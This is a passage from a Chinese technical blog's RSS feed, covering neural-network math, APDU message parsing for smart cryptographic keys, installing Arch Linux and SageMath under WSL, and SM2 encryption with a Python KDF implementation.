线性代数&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;向量&lt;/strong&gt;：一维数组，可以表示输入数据或权重。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;矩阵&lt;/strong&gt;：二维数组，常用于表示权重矩阵或输入数据。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;假设有一个简单的神经网络，输入层有2个神经元，隐藏层有3个神经元。输入数据可以表示为一个向量：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130231136971.png&#34; alt=&#34;image-20250130231136971&#34;&gt;&#xA;隐藏层的权重可以表示为一个矩阵：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130231301044.png&#34; alt=&#34;image-20250130231301044&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;矩阵乘法&#34;&gt;矩阵乘法&lt;/h4&gt;&#xA;&lt;p&gt;矩阵乘法用于前向传播中计算神经元的加权输入。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;计算隐藏层的输入：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130231310393.png&#34; alt=&#34;image-20250130231310393&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;2-微积分&#34;&gt;2. &lt;strong&gt;微积分&lt;/strong&gt;&lt;/h3&gt;&#xA;&lt;h4 id=&#34;导数&#34;&gt;导数&lt;/h4&gt;&#xA;&lt;p&gt;导数用于计算损失函数对权重的梯度。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;假设损失函数为均方误差（MSE）：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130231330044.png&#34; alt=&#34;image-20250130231330044&#34;&gt;&#xA;其中，y^是预测值，y是真实值。损失函数对预测值的导数为：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130231355084.png&#34; alt=&#34;image-20250130231355084&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;链式法则&#34;&gt;链式法则&lt;/h4&gt;&#xA;&lt;p&gt;链式法则用于反向传播中计算梯度。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;假设有一个简单的神经网络，隐藏层的输出为 z，激活函数为 a=σ(z)，损失函数为 L。根据链式法则，损失函数对权重的导数为：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130233912421.png&#34; alt=&#34;image-20250130233912421&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;3-概率与统计&#34;&gt;3. &lt;strong&gt;概率与统计&lt;/strong&gt;&lt;/h3&gt;&#xA;&lt;h4 id=&#34;概率分布&#34;&gt;概率分布&lt;/h4&gt;&#xA;&lt;p&gt;理解数据分布有助于设计损失函数和评估模型。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;假设我们有一个二分类问题，输出层的激活函数为Sigmoid函数，输出值可以解释为概率：&lt;/p&gt;&#xA;&lt;p&gt;P(y=1∣x)=σ(z)P(y=1∣x)=σ(z)&lt;/p&gt;&#xA;&lt;h4 id=&#34;最大似然估计&#34;&gt;最大似然估计&lt;/h4&gt;&#xA;&lt;p&gt;最大似然估计用于定义损失函数。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;对于二分类问题，常用的损失函数为交叉熵损失：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../NeuralNetwork/image-20250130233929606.png&#34; alt=&#34;image-20250130233929606&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;4-优化&#34;&gt;4. &lt;strong&gt;优化&lt;/strong&gt;&lt;/h3&gt;&#xA;&lt;h4 id=&#34;梯度下降&#34;&gt;梯度下降&lt;/h4&gt;&#xA;&lt;p&gt;梯度下降通过计算损失函数的梯度并更新权重来最小化损失。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;：&#xA;假设损失函数对权重的梯度为&lt;img src=&#34;../NeuralNetwork/image-20250130233953350.png&#34; alt=&#34;image-20250130233953350&#34;&gt;，学习率为 η，则权重的更新公式为：&lt;/p&gt;</description>
    </item>
    <item>
      <title>智能密码钥匙与APDU学习笔记</title>
      <link>http://localhost:1313/posts/%E6%99%BA%E8%83%BD%E5%AF%86%E7%A0%81%E9%92%A5%E5%8C%99%E4%B8%8Eapdu%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Mon, 05 Aug 2024 08:33:21 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E6%99%BA%E8%83%BD%E5%AF%86%E7%A0%81%E9%92%A5%E5%8C%99%E4%B8%8Eapdu%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h4 id=&#34;智能密码钥匙&#34;&gt;智能密码钥匙&lt;/h4&gt;&#xA;&lt;p&gt;智能密码钥匙是一种终端密码设备，具备密码运算、密钥管理功能，主要用于存储用户秘密信息（如私钥、数字证书），并完成数据加解密、数据完整性校验、数字签名、访问控制等功能。&lt;/p&gt;&#xA;&lt;p&gt;智能密码钥匙应用数据接口数据格式位于智能密码钥匙应用程序和设备之间，如下图所示：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;智能密码钥匙应用数据接口与设备之间的数据交换以APDU的形式进行编码。APDU可包含有命令报文或响应报文，它从设备接口发送到密码钥匙，或者相反地由密码钥匙发送到设备接口。&lt;/p&gt;&#xA;&lt;h4 id=&#34;命令apdu&#34;&gt;&lt;strong&gt;命令APDU&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;如图所示，本部分所定义的命令APDU由下列内容组成：&lt;/p&gt;&#xA;&lt;p&gt;——必备的4字节命令头（CLA INS P1P2）；&lt;/p&gt;&#xA;&lt;p&gt;——有条件的可变长度主体。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在命令APDU的数据字段中出现的字节数用Lc来表示。&lt;/p&gt;&#xA;&lt;p&gt;在响应APDU的数据字段中期望的字节最大数用Le（期望数据的长度）来表示。当Le字段只包含0时，则要求有效数据字节的最大数。命令APDU有以下四种结构&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在情况1时，长度Lc为0，因此Lc字段和数据字段都为空。长度Le也为0，因此Le字段为空。从而，命令体为空。&lt;/p&gt;&#xA;&lt;p&gt;在情况2时，长度Lc为0，因此Lc字段和数据字段都为空。长度Le不为0，因此Le字段存在。从而，命令体由Le字段组成。&lt;/p&gt;&#xA;&lt;p&gt;在情况3时，长度Lc不为0，因此Lc字段存在，并且数据字段由Lc后续字节组成。长度Le为0，因此Le字段为空。从而命令体由Lc字段后紧跟着数据字段组成。&lt;/p&gt;&#xA;&lt;p&gt;在情况4时，长度Lc不为0，因此Lc字段存在，并且数据字段由Lc后续字节组成。长度Le也不为0，因此Le字段也存在。从而命令体由Lc字段后紧跟着数据字段和Le字段组成。&lt;/p&gt;&#xA;&lt;h4 id=&#34;响应apdu&#34;&gt;&lt;strong&gt;响应APDU&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;响应APDU由以下部分组成：&lt;/p&gt;&#xA;&lt;p&gt;——有条件的可变长度主体；&lt;/p&gt;&#xA;&lt;p&gt;——必备的2字节状态字（SW1—SW2）。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在响应APDU的数据字段中呈现的字节数用Lr来表示。&lt;/p&gt;&#xA;&lt;p&gt;状态字对“命令响应对”之后的接收实体的状态进行了编码。&lt;/p&gt;&#xA;&lt;p&gt;注：如果该命令被放弃，则响应APDU是一个状态字，它按2个状态字节来编码出错条件。&lt;/p&gt;&#xA;&lt;h4 id=&#34;命令头数据字段和响应状态字的编码约定&#34;&gt;&lt;strong&gt;命令头、数据字段和响应状态字的编码约定&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;l CLA（类别）字节&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;l INS（指令）字节&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;状态字节&#34;&gt;&lt;strong&gt;状态字节&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;响应的状态字节SWI-SW2表示了密码钥匙内的处理状态。下图示出了标准定义的值的结构方案。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps9.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;实操中重点关注APDU报文部分，报文可用Bushound进行抓取，报文分析参考标准GM/T 0017-2012《智能密码钥匙 密码应用接口数据格式规范》&lt;/p&gt;&#xA;&lt;p&gt;以某段模拟数据为例进行分析，文件包含有设备、长度、命令、数据、描述等信息&lt;/p&gt;&#xA;&lt;h4 id=&#34;签名报文&#34;&gt;&lt;strong&gt;签名报文&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;分析时首先寻找签名部分，如下图&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps14.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;解题依据：ECC签名命令报文在标准中定义以8074开头，其他内容为P1、P2、Lc、Data、Le&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps15.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据响应长度即可解构出报文数据，8074为报文头，P1字段为02，P2为00，Lc字段为000024，DATA中的应用ID为1000，容器ID为3001，之后36比特为数据，最后2比特0000为Le值&lt;/p&gt;&#xA;&lt;h4 id=&#34;响应报文&#34;&gt;&lt;strong&gt;响应报文&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;签名报文完成后寻找响应报文，响应报文状态码在标准中定义如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps16.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;9000为正确执行，因此在数据包中寻找签名报文后响应为9000的数据，往前数32位即为签名数据，由于数据格式问题，需要排除签名第二行开头的5e，其实需排除每段响应报文的第一个字节（但是标准中并没有找到，和大佬交流后默认所有数据进行排除）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps17.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;提取证书&#34;&gt;&lt;strong&gt;提取证书&lt;/strong&gt;&lt;/h4&gt;&#xA;&lt;p&gt;在APDU中有导出证书操作，根据GM/T 0017中的规定，在导出证书操作中的命令报文编码如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps18.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;因此在寻找报文时主要先看命令头，以上述APDU报文为例进行分析，筛选804E即可找到导出证书部分的报文，其中包含证书，且证书为加密证书。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps19.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时直接提取会发现证书无法解析，因为在证书以6A 9E为结尾时表明还未传输完毕，需继续寻找下一个804E字段，直至到9000正确响应，但是其中的数据需进行区分，从第一个3082证书头开始，到6A 9E为证书有效内容，另外第二个包则需要按照签名值长度往前数对应字节数进行拼接，最终有效部分如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps20.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;取出相应内容后证书即可解析&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml1312/wps21.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;因一些原因，该段报文的数据包无法给出，建议有条件的朋友自行抓取&lt;/p&gt;</description>
    </item>
    <item>
      <title>WSL安装ArchLinux和Sagemath</title>
      <link>http://localhost:1313/posts/wsl%E5%AE%89%E8%A3%85archlinux%E5%92%8Csagemath/</link>
      <pubDate>Fri, 05 Jul 2024 08:33:21 +0800</pubDate>
      <guid>http://localhost:1313/posts/wsl%E5%AE%89%E8%A3%85archlinux%E5%92%8Csagemath/</guid>
      <description>&lt;h2 id=&#34;默认配置仅在wsl中安装sagemath&#34;&gt;（默认配置）仅在WSL中安装sagemath&lt;/h2&gt;&#xA;&lt;p&gt;首先在控制面板中启用虚拟化平台功能&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps27.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装wsl，使用命令wsl &amp;ndash;install，等待windows完成虚拟化系统的下载和安装，如果出现以下错误，并且确定虚拟化已经打开&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps28.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行bcdedit /set hypervisorlaunchtype auto命令后重启电脑，即可成功启动wsl，wsl中安装的操作系统可以用命令wsl -l -v 进行查看&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps29.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过命令行直接运行wsl，即可直接进入Ubuntu系统&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps30.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;修改/etc/apt/sources.list将源更新为国内源，直接使用apt命令安装segamath即可&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps31.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装完成后即可启动，阿里云源中的sagemath版本为9.5&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps32.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;wsl中安装arch-linux和最新版本sagemath&#34;&gt;WSL中安装Arch Linux和最新版本Sagemath&lt;/h2&gt;&#xA;&lt;p&gt;由于Ubuntu的阿里云源中提供的Sagemath版本仅9.5，因此安装最新版本的只能通过编译完成，如需快捷安装需在Arch linux中进行。使用wsl寻找镜像命令时发现官方的源中并没有ArchLinux，因此需要去第三方进行下载&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps14.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;访问&lt;a href=&#34;https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/&#34;&gt;清华源地址&lt;/a&gt;下载最新版本的ArchLinux的tar.zst文件，下载完成后解压并通过zstd命令和gzip命令转化为tar.gz，在github下载&lt;a href=&#34;https://github.com/DDoSolitary/LxRunOffline/releases&#34;&gt;安装工具&lt;/a&gt;，使用如下命令进行安装&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LxRunOffline.exe i -n Arch -f D:/WSLArch/archlinux-bootstrap-2024.07.01-x86_64.tar.gz -d D:/WSLArch/Arch -r root.x86_64&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps15.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行完成后可以看到Arch已经安装完成，使用命令即可进入系统&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps16.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps17.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;由于系统比较简陋，很多常见命令都没有，需要进行额外配置&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps18.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;由于默认的Arch过于精简，没有相关应用，因此需要在Windows上使用编辑器编辑/etc/pacman.conf，修改如下配置&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps19.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;编辑/etc/pacman.d/mirrorlist，选择合适的源&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps20.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装完成后使用pacman -Syu更新&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps21.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;更新完成后依次执行&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pacman-key --init&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pacman-key --populate&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pacman -Sy archlinux-keyring&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后再用passwd更新一下口令，基本配置就完成了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps22.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用pacman安装Sage&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pacman -Sy sagemath&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps23.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装完成后即可运行10.3版本的sage&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps24.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后还需要配置Jupyter，使用pacman安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml14052/wps25.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装完成后使用命令启动Jupyter Server&lt;/p&gt;</description>
    </item>
    <item>
      <title>SM2与KDF学习笔记</title>
      <link>http://localhost:1313/posts/sm2%E5%92%8Ckdf/</link>
      <pubDate>Wed, 12 Jun 2024 05:12:49 +0800</pubDate>
      <guid>http://localhost:1313/posts/sm2%E5%92%8Ckdf/</guid>
      <description>&lt;h2 id=&#34;sm2加密算法&#34;&gt;SM2加密算法&lt;/h2&gt;&#xA;&lt;p&gt;SM2算法是一种基于椭圆曲线密码的公钥密码算法，其安全性主要基于椭圆曲线离散对数难题。该算法由国家密码管理局设计并公开，是我国自主创新的一种密码算法，可应用于数据加密、解密、数字签名等操作。SM2算法包括密钥生成算法、加密算法、解密算法和数字签名算法等部分。&lt;/p&gt;&#xA;&lt;p&gt;SM2加密算法过程如下：&lt;/p&gt;&#xA;&lt;p&gt;用户A的原始数据为椭圆曲线系统参数、长度为klen比特的消息M、公钥PB&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;产生随机数k∈[1,n-1]&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;计算椭圆曲线点C1=[k]G=(x1,y1)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;计算椭圆曲线点S=[h]PB&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;计算[k]PB=(x2,y2)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;计算t=KDF(x2||y2,klen)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;计算C2=M⊕t&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;计算C3=Hash(x2||M||y2)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;输出密文C=C1||C2||C3&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/image-20241201151129640.png&#34; alt=&#34;image-20241201151129640&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;其中椭圆曲线方程为&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/wps22.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;密钥派生函数kdf&#34;&gt;密钥派生函数KDF&lt;/h2&gt;&#xA;&lt;p&gt;KDF密钥派生函数在标准GB/T 32918.4 《信息安全技术 SM2椭圆曲线公钥密码算法 第4部分：公钥加密算法》中定义，本质上是进行哈希运算扩展长度，再截取相应长度字段，如下所示：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/image-20241201151216812.png&#34; alt=&#34;image-20241201151216812&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用Python代码实现SM2中的KDF函数如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; math &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ceil&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; gmssl.sm3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sm3_hash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Z&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;57E7B63623FAE5F08CDA468E872A20AFA03DED41BF1403770E040DC83AF31A67991F2B01EBF9EFD8881F0A0493000603&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hex2byte&lt;/span&gt;(msg): &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ml &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(msg)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ml &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; msg&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ml &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(len(msg)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  msg_byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(ml):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# print(msg[i*2:i*2+2])&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    msg_byte&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(int(msg[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; msg_byte&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KDF&lt;/span&gt;(Z,klen): 